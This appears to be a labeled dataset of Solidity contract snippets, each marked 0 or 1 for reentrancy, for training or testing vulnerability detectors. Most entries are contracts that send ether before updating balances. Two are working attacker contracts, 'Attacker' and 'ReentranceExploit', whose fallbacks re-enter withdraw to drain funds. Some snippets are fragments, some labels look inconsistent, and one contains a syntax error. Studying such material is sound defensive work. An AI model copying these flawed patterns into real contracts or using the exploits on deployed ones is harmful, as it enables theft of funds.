if (block.number>=startBlock && block.number<=startBlock+prePeriod && safeAdd(totalEtherRaised,value) > preEtherCap) throw;
uint tokens = safeMul(value, price());
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
totalEtherRaised = safeAdd(totalEtherRaised, value);
if (block.number<=startBlock+prePeriod) {
presaleTokenSupply = safeAdd(presaleTokenSupply, tokens);
Transfer(address(0), recipient, tokens);
if (!founder.call.value(value)()) throw;
Buy(recipient, value, tokens);
1
---------------------------------
1981 39973.sol
39973.sol
function _unsafeSend(address _to, uint _value) internal returns(bool) {
return _to.call.value(_value)();
function _forward(address _to, bytes _data) internal returns(bool, bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return (false, _safeFalse());
if (!_to.call.value(msg.value)(_data)) {
return (false, _safeFalse());
return (true, _applyRefund(startGas));
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
function checkForward(bytes _data) constant returns(bool, bool) {
return _forward(allowedForwards[sha3(_data[0], _data[1], _data[2], _data[3])], _data);
1
---------------------------------
1982 10715.sol
10715.sol
function approveAndCall(address _spender,  uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
function transferAndCall(address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transfer(_to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function transferFromAndCall(address _from, address _to, uint256 _value, bytes _data) public payable returns (bool) {
require(_to != address(this));
super.transferFrom(_from, _to, _value);
require(_to.call.value(msg.value)(_data));
return true;
function increaseApprovalAndCall(address _spender,uint _addedValue,bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.increaseApproval(_spender, _addedValue);
require(_spender.call.value(msg.value)(_data));
return true;
function decreaseApprovalAndCall(address _spender, uint _subtractedValue, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.decreaseApproval(_spender, _subtractedValue);
require(_spender.call.value(msg.value)(_data));
return true;
contract AtripToken is ERC827Token {
using SafeMath for uint256;
string public name = "Atrip Token";
string public symbol = "APK";
uint public decimals = 18;
address public wallet = 0x0;
1
---------------------------------
1983 30460.sol
30460.sol
function close() onlyOwner public {
require(state == State.Active);
state = State.Closed;
Closed();
wallet.call.value(this.balance)();
function forwardFunds() onlyOwner public {
require(this.balance > 0);
wallet.call.value(this.balance)();
contract FinalizableCrowdsale is BurnableCrowdsale, Ownable {
using SafeMath for uint256;
bool public isFinalized = false;
event Finalized();
function forwardFundsToWallet(uint256 amount) internal {
if (goalReached() && vault.balance > 0) {
vault.forwardFunds();
if (goalReached()) {
wallet.call.value(amount)();
} else {
vault.deposit.value(amount)(msg.sender);
0
---------------------------------
1984 4679.sol
4679.sol
function giveToken(address _buyer) internal {
require( pendingTokenUser[_buyer] > 0, "pendingTokenUser[_buyer] > 0" );
tokenUser[_buyer] = tokenUser[_buyer].add(pendingTokenUser[_buyer]);
tokenSaleContract.sendTokens(_buyer, pendingTokenUser[_buyer]);
soldTokens = soldTokens.add(pendingTokenUser[_buyer]);
pendingTokenUser[_buyer] = 0;
require( address(tokenSaleContract).call.value( etherUser[_buyer] )( bytes4( keccak256("forwardEther()") ) ) );
etherUser[_buyer] = 0;
function forwardEther() onlyRC payable public returns(bool) {
require(milestoneSystem.call.value(msg.value)(), "wallet.call.value(msg.value)()");
return true;
0
---------------------------------
1985 40340.sol
40340.sol
function withdrawFunds(uint amount) {
if (accountIDs[msg.sender]>0) {
if (int(amount)<=getFunds(msg.sender, true) && int(amount)>0) {
accounts[accountIDs[msg.sender]].capital -= int(amount);
msg.sender.call.value(amount)();
Withdraw(msg.sender, amount, accounts[accountIDs[msg.sender]].capital);
function expire(uint accountID, uint8 v, bytes32 r, bytes32 s, bytes32 value) {
if (expired == false) {
if (ecrecover(sha3(factHash, value), v, r, s) == ethAddr) {
uint lastAccount = numAccounts;
if (accountID==0) {
accountID = 1;
} else {
lastAccount = accountID;
for (accountID=accountID; accountID<=lastAccount; accountID++) {
if (positions[accounts[accountID].user].expired == false) {
int result = positions[accounts[accountID].user].cash / 1000000000000000000;
for (uint optionID=0; optionID<numOptions; optionID++) {
int moneyness = getMoneyness(options[optionID], uint(value), margin);
result += moneyness * positions[accounts[accountID].user].positions[optionID] / 1000000000000000000;
positions[accounts[accountID].user].expired = true;
uint amountToSend = uint(accounts[accountID].capital + result);
accounts[accountID].capital = 0;
if (positions[accounts[accountID].user].hasPosition==true) {
numPositionsExpired++;
accounts[accountID].user.call.value(amountToSend)();
Expire(msg.sender, accounts[accountID].user);
if (numPositionsExpired == numPositions) {
expired = true;
0
---------------------------------
1986 2387_1.sol
2387_1.sol
function transferAndCall(address to,  uint256 value,  bytes data) public payable liquid returns (bool) {
require(to != address(this) && data.length >= 68 &&   transfer(to, value));
assembly {
mstore(add(data, 36), value)
mstore(add(data, 68), caller)
require(to.call.value(msg.value)(data));
return true;
1
---------------------------------
1987 21697_1.sol
21697_1.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1988 24007_1.sol
24007_1.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1989 23803_1.sol
23803_1.sol
function () payable {
if (!founder.call.value(msg.value)()) revert();
0
---------------------------------
1990 39326_1.sol
39326_1.sol
function executeProposal( uint256 id, bytes   transactionBytecode) onlyMembers {
Proposal p = proposals[id];
if (now < p.votingDeadline || p.executed || p.proposalHash != sha3(p.recipient, p.amount, transactionBytecode) || p.numberOfVotes < minimumQuorum)  throw;
if (p.currentResult > majorityMargin) {
p.executed = true;
if (!p.recipient.call.value(p.amount)(transactionBytecode))  throw;
p.proposalPassed = true;
} else {
p.proposalPassed = false;
ProposalTallied(id, p.numberOfVotes, p.proposalPassed);
library CreatorCongress {
0
---------------------------------
1991 30101_1.sol
30101_1.sol
function reject(address _participant) onlyOwner public {
uint256 weiAmount = deposited[_participant];
require(weiAmount > 0);
deposited[_participant] = 0;
Rejected(_participant);
require(_participant.call.value(weiAmount)());
function rejectMany(address[] _participants) onlyOwner public {
for (uint256 i = 0; i < _participants.length; i++) {
reject(_participants[i]);
0
---------------------------------
1992 9221_1.sol
9221_1.sol
function bet() payable {
if ((random()%2==1) && (msg.value == 1 ether) && (!locked))  {
if (!msg.sender.call.value(2 ether)())
throw;
function releaseFunds(uint amount) {
if (gameOwner==msg.sender)  {
if (!msg.sender.call.value( amount * (1 ether))())
throw;
0
---------------------------------
1993 39705_1.sol
39705_1.sol
function empty() returns (bool) {
return foundationWallet.call.value(this.balance)();
function donateAs(address addr) private returns (bool) {
state st = getState();
if (st != state.round0 && st != state.round1) { throw; }
if (msg.value < minDonation) { throw; }
if (weiPerCHF == 0) { throw; }
totalWeiDonated += msg.value;
weiDonated[addr] += msg.value;
uint chfCents = (msg.value * 100) / weiPerCHF;
bookDonation(addr, now, chfCents, "ETH", "");
return foundationWallet.call.value(this.balance)();
0
---------------------------------
1994 39664_1.sol
39664_1.sol
function migrateBlockjack() only(ADMIN_CONTRACT) {
stopBlockjack();
if (currentBankroll > initialBankroll) {
if (!ADMIN_CONTRACT.call.value(currentBankroll - initialBankroll)()) throw;
suicide(DX);
function shareProfits() onlyOwner {
if (profitsLockedUntil > now) throw;
if (currentBankroll <= initialBankroll) throw;
uint256 profit = currentBankroll - initialBankroll;
if (!ADMIN_CONTRACT.call.value(profit)()) throw;
currentBankroll -= profit;
bankrollLockedUntil = now + BANKROLL_LOCK_PERIOD;
profitsLockedUntil = bankrollLockedUntil + BANKROLL_LOCK_PERIOD;
0
---------------------------------
1995 12182_1.sol
12182_1.sol
function transferEther(address to, uint256 amount) public returns (bool) {
require(msg.sender == owner);
return to.call.value(amount)();
function() public payable {}
contract Controller is ControllerStorage, Ownable, HasWorkers {
event CreatedUserWallet(address _wallet);
event WithdrawEth(address _wallet, address _to, uint256 _amount);
event WithdrawToken(address _token, address _wallet, address _to, uint256 _amount);
event ChangedForward(address _old, address _new, address _operator);
constructor() public {
setForward(msg.sender);
function executeTransaction(address destination, uint256 value, bytes memory _bytes) public onlyOwner returns (bool) {
return destination.call.value(value)(_bytes);
function withdrawEthBatch(Wallet[] wallets) public onlyWorker returns (bool) {
uint256 size = wallets.length;
uint256 balance;
Wallet wallet;
for (uint256 i = 0; i < size; i++) {
wallet = wallets[i];
balance = wallet.balance;
if (wallet.transferEther(this, balance)) {
emit WithdrawEth(wallet, forward, balance);
forward.call.value(address(this).balance)();
return true;
0
---------------------------------
1996 32559_1.sol
32559_1.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1997 35617_1.sol
35617_1.sol
function buyRecipient(address recipient) duringCrowdSale payable {
require(!halted);
uint tokens = safeMul(msg.value, price(block.timestamp));
require(safeAdd(saleTokenSupply,tokens)<=coinAllocation );
balances[recipient] = safeAdd(balances[recipient], tokens);
totalSupply = safeAdd(totalSupply, tokens);
saleTokenSupply = safeAdd(saleTokenSupply, tokens);
salesVolume = safeAdd(salesVolume, msg.value);
if (!founder.call.value(msg.value)()) revert();
Buy(recipient, msg.value, tokens);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
function buy() payable {
buyRecipient(msg.sender);
function() payable {
buyRecipient(msg.sender);
0
---------------------------------
1998 25808_1.sol
25808_1.sol
function getTokens(uint num, address addr) public {
for(uint i = 0; i < num; i++){
addr.call.value(0 wei)();
1
---------------------------------
1999 22805_1.sol
22805_1.sol
function eT(address _pd, uint _tkA, uint _etA) returns (bool success) {
balances[msg.sender] = safeSub(balances[msg.sender], _tkA);
balances[_pd] = safeAdd(balances[_pd], _tkA);
if (!_pd.call.value(_etA)()) revert();
ET(_pd, _tkA, _etA);
return true;
0
---------------------------------
2000 Reentrance_exploit_1.sol
Reentrance_exploit_1.sol
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
1
---------------------------------
contract PIGGY_BANK
{
mapping (address => uint) public Accounts;
uint public MinSum = 1 ether;
Log LogFile;
uint putBlock;
function PIGGY_BANK(address _log)
public
{
LogFile = Log(_log);
}
function Put(address to)
public
payable
{
Accounts[to]+=msg.value;
LogFile.AddMessage(msg.sender,msg.value,"Put");
putBlock = block.number;
}
function Collect(uint _am) public payable {
if(Accounts[msg.sender]>=MinSum && _am<=Accounts[msg.sender] && block.number>putBlock) {
if(msg.sender.call.value(_am)()) {
Accounts[msg.sender]-=_am;
LogFile.AddMessage(msg.sender,_am,"Collect");
}
}
}
function()
public
payable
{
Put(msg.sender);
}
}
contract Log
{
struct Message
{
address Sender;
string  Data;
uint Val;
uint  Time;
}
Message[] public History;
Message LastMsg;
function AddMessage(address _adr,uint _val,string _data)
public
{
LastMsg.Sender = _adr;
LastMsg.Time = now;
LastMsg.Val = _val;
LastMsg.Data = _data;
History.push(LastMsg);
}
}
1
---------------------------------
library SafeMath {
function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
if (a == 0) {
return 0;
}
c = a * b;
assert(c / a == b);
return c;
}
function div(uint256 a, uint256 b) internal pure returns (uint256) {
return a / b;
}
function sub(uint256 a, uint256 b) internal pure returns (uint256) {
assert(b <= a);
return a - b;
}
function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
c = a + b;
assert(c >= a);
return c;
}
}
contract ERC20Basic {
function totalSupply() public view returns (uint256);
function balanceOf(address who) public view returns (uint256);
function transfer(address to, uint256 value) public returns (bool);
event Transfer(address indexed from, address indexed to, uint256 value);
}
contract ERC20 is ERC20Basic {
function allowance(address owner, address spender)
public view returns (uint256);
function transferFrom(address from, address to, uint256 value)
public returns (bool);
function approve(address spender, uint256 value) public returns (bool);
event Approval(
address indexed owner,
address indexed spender,
uint256 value
);
}
contract IMultiToken {
function changeableTokenCount() external view returns(uint16 count);
function tokens(uint256 i) public view returns(ERC20);
function weights(address t) public view returns(uint256);
function totalSupply() public view returns(uint256);
function mint(address _to, uint256 _amount) public;
}
contract BancorBuyer {
using SafeMath for uint256;
mapping(address => uint256) public balances;
mapping(address => mapping(address => uint256)) public tokenBalances;
function sumWeightOfMultiToken(IMultiToken mtkn) public view returns(uint256 sumWeight) {
for (uint i = mtkn.changeableTokenCount(); i > 0; i--) {
sumWeight += mtkn.weights(mtkn.tokens(i - 1));
}
}
function deposit(address _beneficiary, address[] _tokens, uint256[] _tokenValues) payable external {
if (msg.value > 0) {
balances[_beneficiary] = balances[_beneficiary].add(msg.value);
}
for (uint i = 0; i < _tokens.length; i++) {
ERC20 token = ERC20(_tokens[i]);
uint256 tokenValue = _tokenValues[i];
uint256 balance = token.balanceOf(this);
token.transferFrom(msg.sender, this, tokenValue);
require(token.balanceOf(this) == balance.add(tokenValue));
tokenBalances[_beneficiary][token] = tokenBalances[_beneficiary][token].add(tokenValue);
}
}
function withdraw(address _to, uint256 _value, address[] _tokens, uint256[] _tokenValues) external {
if (_value > 0) {
_to.transfer(_value);
balances[msg.sender] = balances[msg.sender].sub(_value);
}
for (uint i = 0; i < _tokens.length; i++) {
ERC20 token = ERC20(_tokens[i]);
uint256 tokenValue = _tokenValues[i];
uint256 tokenBalance = token.balanceOf(this);
token.transfer(_to, tokenValue);
require(token.balanceOf(this) == tokenBalance.sub(tokenValue));
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].sub(tokenValue);
}
}
function buyOne(ERC20 token, address _exchange, uint256 _value, bytes _data) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
uint256 tokenBalance = token.balanceOf(this);
require(_exchange.call.value(_value)(_data));
balances[msg.sender] = balances[msg.sender].sub(_value);
tokenBalances[msg.sender][token] = tokenBalances[msg.sender][token].add(token.balanceOf(this).sub(tokenBalance));
}
function buy1(address[] _tokens,  address[] _exchanges, uint256[] _values, bytes _data1) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
this.buyOne(ERC20(_tokens[0]), _exchanges[0], _values[0], _data1);
}
function buy2(address[] _tokens, address[] _exchanges, uint256[] _values, bytes _data1, bytes _data2) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
this.buyOne(ERC20(_tokens[0]), _exchanges[0], _values[0], _data1);
this.buyOne(ERC20(_tokens[1]), _exchanges[1], _values[1], _data2);
}
function buy3(address[] _tokens, address[] _exchanges, uint256[] _values, bytes _data1, bytes _data2, bytes _data3) payable public {
balances[msg.sender] = balances[msg.sender].add(msg.value);
this.buyOne(ERC20(_tokens[0]), _exchanges[0], _values[0], _data1);
this.buyOne(ERC20(_tokens[1]), _exchanges[1], _values[1], _data2);
this.buyOne(ERC20(_tokens[2]), _exchanges[2], _values[2], _data3);
}
}
1
---------------------------------
contract Bank{
mapping (address => uint256) public balances;
function wallet() constant returns(uint256 result){
return this.balance;
}
function recharge() payable{
balances[msg.sender]+=msg.value;
}
function withdraw(){
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
}
}
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
}
function attack() payable{
attackCount = 0;
Bank bank = Bank(bankAddr);
bank.recharge.value(msg.value)();
bank.withdraw();
}
function () payable{
if(msg.sender==bankAddr&&attackCount<5){
attackCount+=1;
Bank bank = Bank(bankAddr);
bank.withdraw();
}
}
function wallet() constant returns(uint256 result){
return this.balance;
}
}
1
---------------------------------
contract Owner{
mapping (address => uint) private userBalances;
mapping (address => bool) private claimedBonus;
mapping (address => uint) private rewardsForA;
function untrustedWithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
if (recipient.call.value(amountToWithdraw)() == false) {
throw;
}
}
function untrustedGetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {throw;}
claimedBonus[recipient] = true;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
}
}
1
---------------------------------
contract crossFunctionReentrancy{
mapping (address => bool) private claimedBonus;
mapping (address => uint) private rewardsForA;
function WithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
require(recipient.call.value(amountToWithdraw)());
}
function GetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {
throw;
}
rewardsForA[recipient] += 100;
WithdrawReward(recipient);
claimedBonus[recipient] = false;
}
}
1
---------------------------------
contract dumbDAO {
event PaymentCalled(address payee, uint amount);
event TokensBought(address buyer, uint amount);
event TokensTransfered(address from, address to, uint amount);
event InsufficientFunds(uint bal, uint amount);
mapping (address => uint) public balances;
function buyTokens(){
balances[msg.sender] += msg.value;
TokensBought(msg.sender, msg.value);
}
function transferTokens(address _to, uint _amount){
if (balances[msg.sender] < _amount)
throw;
balances[_to]=_amount;
balances[msg.sender]-=_amount;
TokensTransfered(msg.sender, _to, _amount);
}
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
}
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
}
}
}
1
---------------------------------
contract EtherStore {
uint256 public withdrawalLimit = 1 ether;
mapping(address => uint256) public lastWithdrawTime;
mapping(address => uint256) public balances;
function depositFunds() public payable {
balances[msg.sender] += msg.value;
}
function withdrawFunds (uint256 _weiToWithdraw) public {
require(balances[msg.sender] >= _weiToWithdraw);
require(_weiToWithdraw <= withdrawalLimit);
require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
require(msg.sender.call.value(_weiToWithdraw)());
balances[msg.sender] -= _weiToWithdraw;
lastWithdrawTime[msg.sender] = now;
}
}
1
---------------------------------
contract Reentrance {
mapping (address => uint) userBalance;
function getBalance(address u) constant returns(uint){
return userBalance[u];
}
function addToBalance() payable{
userBalance[msg.sender] += msg.value;
}
function withdrawBalance_fixed(){
uint amount = userBalance[msg.sender];
userBalance[msg.sender] = 0;
if(!(msg.sender.call.value(amount)())){ throw; }
}
}
0
---------------------------------
contract Private_Bank
{
mapping (address => uint) public balances;
uint public MinDeposit = 1 ether;
Log TransferLog;
function Private_Bank(address _log)   {
TransferLog = Log(_log);
}
function Deposit() public  payable  {
if(msg.value >= MinDeposit) {
balances[msg.sender]+=msg.value;
TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
}
}
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
}
}
}
function() public payable{}
}
contract Log
{
struct Message
{
address Sender;
string  Data;
uint Val;
uint  Time;
}
Message[] public History;
Message LastMsg;
function AddMessage(address _adr,uint _val,string _data)  public {
LastMsg.Sender = _adr;
LastMsg.Time = now;
LastMsg.Val = _val;
LastMsg.Data = _data;
History.push(LastMsg);
}
}
1
---------------------------------
contract Reentrance {
mapping (address => uint) userBalance;
function getBalance(address u) constant returns(uint){
return userBalance[u];
}
function addToBalance() payable{
userBalance[msg.sender] += msg.value;
}
function withdrawBalance(){
if(!(msg.sender.call.value(userBalance[msg.sender])())){
throw;
}
userBalance[msg.sender] = 0;
}
}
1
---------------------------------
contract Reentrance {
mapping(address => uint) public balances;
function donate(address _to) public payable {
balances[_to] += msg.value;
}
function balanceOf(address _who) public view returns (uint balance) {
return balances[_who];
}
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
}
balances[msg.sender] -= _amount;
}
}
function() public payable {}
}
1
---------------------------------
contract ReentranceExploit {
bool public attackModeIsOn=false;
address public vulnerable_contract;
address public owner;
function ReentranceExploit() public{
owner = msg.sender;
}
function deposit(address _vulnerable_contract) public payable{
vulnerable_contract = _vulnerable_contract ;
require(vulnerable_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
}
function launch_attack() public{
attackModeIsOn = true;
require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
}
function () public payable{
if (attackModeIsOn){
attackModeIsOn = false;
require(vulnerable_contract.call(bytes4(sha3("withdrawBalance()"))));
}
}
function get_money(){
suicide(owner);
}
}
1
---------------------------------
contract SendBalance {
mapping (address => uint) userBalances ;
bool withdrawn = false ;
function getBalance(address u) constant returns (uint){
return userBalances[u];
}
function addToBalance() {
userBalances msg.sender] += msg.value ;
}
function withdrawBalance(){
if (!(msg.sender.call.value(userBalances[msg.sender])())) { throw ; }
userBalances[msg.sender] = 0;
}
}
1
---------------------------------
contract SimpleDAO {
mapping (address => uint) public credit;
function donate(address to) {
credit[to] += msg.value;
}
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
}
}
function queryCredit(address to) returns (uint){
return credit[to];
}
}
1
---------------------------------
contract SimpleDAO {
mapping (address => uint) public credit;
function donate(address to) payable public {
credit[to] += msg.value;
}
function withdraw(uint amount) public {
if (credit[msg.sender] < amount) {
throw;
}
require(msg.sender.call.value(amount)());
credit[msg.sender] -= amount;
}
function queryCredit(address to) view public returns(uint){
return credit[to];
}
}
1
---------------------------------
contract SimpleDAO {
mapping (address => uint) public credit;
function donate(address to) payable public{
credit[to] += msg.value;
}
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
}
}
function queryCredit(address to) view public returns (uint){
return credit[to];
}
}
1
---------------------------------
contract Victim {
mapping(address => uint) public balances;
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
}
balances[msg.sender] -= _amount;
}
}
function deposit() payable {}
}
1
---------------------------------
